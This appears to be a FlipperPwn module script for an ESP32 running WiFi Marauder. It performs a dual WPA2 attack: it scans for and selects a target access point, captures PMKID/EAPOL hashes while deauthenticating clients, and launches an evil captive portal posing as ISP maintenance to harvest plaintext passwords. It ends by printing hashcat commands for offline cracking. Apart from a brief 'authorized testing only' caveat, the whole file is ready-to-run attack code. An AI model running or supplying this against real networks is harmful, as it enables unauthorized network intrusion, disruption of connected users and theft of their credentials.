# FlipperPwn Module — PMKID Harvest + Parallel Portal
# Dual-vector WPA2 attack:
#   - PMKID/EAPOL capture (offline-crackable hash for hashcat/john)
#   - Evil portal with matching SSID (plaintext credential harvest)
# Running both maximizes success: whichever yields first wins, and the deauth
# used during capture also drives clients toward the portal.
#
# Output on the ESP32 SD card:
#   /logs/pmkid_<ts>.pcap  — import to hashcat with -m 22000
#   /logs/evil_portal.log  — plaintext captures from the portal
#
# Single `PLATFORM ALL` block (see evil_twin.fpwn for the why). Marauder command
# names/flags vary by fork — adjust the WIFI_CMD lines to your ESP32 build.
#
# REQUIREMENTS:
#   - ESP32 WiFi Dev Board + WiFi Marauder
#   - AUTHORIZED TESTING ONLY — WPA2 key extraction is illegal without authorization

NAME        pmkid_harvest
DESCRIPTION Dual-vector: PMKID hash capture + parallel evil portal for direct credential harvest
CATEGORY    credential
PLATFORMS   WIN,MAC,LINUX

# Note: .fpwn OPTION default values are single tokens (the parser splits on
# spaces), so a full hashcat command line can't be a default — it's printed in
# the report below instead.
OPTION AP_INDEX    0               "Target AP index from prior scanap"
OPTION CAPTURE_SEC 60              "Seconds to run PMKID capture"
OPTION PORTAL      isp_maintenance.html "Portal page (match target ISP if known)"

PLATFORM ALL
IF_CONNECTED
  # ── Phase 1: AP recon ───────────────────────────────────────────────────
  PRINT Phase 1: Scanning APs...
  LED_COLOR BLUE
  WIFI_SCAN
  WIFI_WAIT 10000

  # ── Phase 2: PMKID + deauth ─────────────────────────────────────────────
  # Select the target AP, start PMKID/EAPOL capture, then deauth to force the
  # 4-way handshake. Runs for CAPTURE_SEC seconds.
  PRINT Phase 2: PMKID capture AP {{AP_INDEX}}
  LED_COLOR MAGENTA
  WIFI_CMD select -a {{AP_INDEX}}
  WIFI_WAIT 500
  WIFI_CMD sniffpmkid
  WIFI_WAIT 1000
  WIFI_CMD attack -t deauth
  WIFI_WAIT {{CAPTURE_SEC}}000
  WIFI_STOP

  # ── Phase 3: Portal (plaintext vector) ──────────────────────────────────
  PRINT Phase 3: Portal {{PORTAL}} active
  LED_COLOR RED
  WIFI_CMD evilportal -c set html /portals/{{PORTAL}}
  WIFI_WAIT 500
  WIFI_CMD evilportal -c start
  WIFI_WAIT 3000
  WIFI_STOP

  # ── Phase 4: Report ─────────────────────────────────────────────────────
  LED_COLOR CYAN
  OPEN_NOTEPAD
  DELAY 1500
  STRINGLN === PMKID Harvest Results ===
  STRINGLN PCAP saved to ESP32 SD: /logs/pmkid_*.pcap
  STRINGLN Portal log: /logs/evil_portal.log
  STRINGLN
  STRINGLN Crack offline:
  STRINGLN   hcxpcapngtool -o hash.hc22000 capture.pcap
  STRINGLN   hashcat -m 22000 -a 3 hash.hc22000
  STRINGLN
  STRINGLN Target AP index: {{AP_INDEX}}   Portal: {{PORTAL}}
  LED_COLOR GREEN
  PRINT Harvest complete — check Flipper + SD logs
END_IF
